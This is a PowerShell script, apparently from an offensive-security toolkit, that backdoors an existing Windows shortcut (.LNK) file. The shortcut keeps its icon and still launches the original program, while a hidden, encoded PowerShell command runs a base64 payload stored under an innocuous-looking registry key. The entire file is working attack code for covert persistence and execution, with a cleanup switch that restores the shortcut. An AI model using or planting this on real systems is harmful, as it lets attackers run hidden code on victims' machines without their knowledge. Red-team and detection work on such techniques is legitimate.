function Invoke-BackdoorLNK {
<#
    .SYNOPSIS

        Takes an existing (full) .LNK path and backdoors it to trigger a base64-encoded and registry-stored script.
        The original application is still launched, the original icon is preserved, and no powershell.exe window pops up.

        Author: @harmj0y
        License: BSD 3-Clause

    .PARAMETER LNKPath

        The full path to the existing .LNK to backdoor/cleanup. Required.

    .PARAMETER EncScript

        Unicode base64-encoded script to store in the registry.

    .PARAMETER RegPath

        Registry path to store the encoded payload in.
        Defaults to 'HKCU:\Software\Microsoft\Windows\debug'

    .PARAMETER Cleanup

        Switch. Restore the .LNK's original parameters.

    .EXAMPLE

        PS C:\> Invoke-BackdoorLNK -LNKPath C:\Users\john\Desktop\Firefox.lnk -EncScript AA...

        Store the specified b64 script into HKCU:\Software\Microsoft\Windows\debug and
        set the shortcut at C:\Users\john\Desktop\Firefox.lnk to launch the original
        Firefox binary and then decode/trigger the registry payload.

    .EXAMPLE

        PS C:\> Invoke-BackdoorLNK -LNKPath C:\Users\john\Desktop\Firefox.lnk -CleanUp

        Remove the registry payload and restore the original path to the shortcut.

    .LINK

        http://windowsitpro.com/powershell/working-shortcuts-windows-powershell
        http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
        https://github.com/samratashok/nishang
        http://blog.trendmicro.com/trendlabs-security-intelligence/black-magic-windows-powershell-used-again-in-new-attack/
#>

    [CmdletBinding()] Param(
        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $LNKPath,

        [String]
        $EncScript,

        [String]
        $RegPath = 'HKCU:\Software\Microsoft\Windows\debug',

        [Switch]
        $Cleanup
    )

    $RegParts = $RegPath.split("\")
    $Path = $RegParts[0..($RegParts.Count-2)] -join "\"
    $Name = $RegParts[-1]


    $Obj = New-Object -ComObject WScript.Shell
    $LNK = $Obj.CreateShortcut($LNKPath)

    # save off the old .LNK parameters
    $TargetPath = $LNK.TargetPath
    $WorkingDirectory = $LNK.WorkingDirectory
    $IconLocation = $LNK.IconLocation

    if($CleanUp) {

        # restore the original .LNK parameters
        $OriginalPath = ($IconLocation -split ",")[0]

        $LNK.TargetPath = $OriginalPath
        $LNK.Arguments = $Null
        $LNK.WindowStyle = 1
        $LNK.Save()

        # remove the stored registry Value
        $null = Remove-ItemProperty -Force -Path $Path -Name $Name
    }
    else {

        if(!$EncScript -or $EncScript -eq '') {
            throw "-EncScript or -Cleanup required!"
        }

        # store the encoded script into the specified registry key
        $null = Set-ItemProperty -Force -Path $Path -Name $Name -Value $EncScript

        "[*] B64 script stored at '$RegPath'`n"

        # trojanize in our new link arguments
        $LNK.TargetPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"

        # set the .LNK to launch the original binary path first before our functionality
        $LaunchString = '[System.Diagnostics.Process]::Start("'+$TargetPath+'");IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp '+$Path+' '+$Name+').'+$Name+')))'

        $LaunchBytes  = [System.Text.Encoding]::UNICODE.GetBytes($LaunchString)
        $LaunchB64 = [System.Convert]::ToBase64String($LaunchBytes)

        $LNK.Arguments = "-w hidden -nop -enc $LaunchB64"

        # make sure to match the old working directory
        $LNK.WorkingDirectory = $WorkingDirectory
        $LNK.IconLocation = "$TargetPath,0"
        $LNK.WindowStyle = 7
        $LNK.Save()

        "[*] .LNK at $LNKPath set to trigger`n"
    }
}
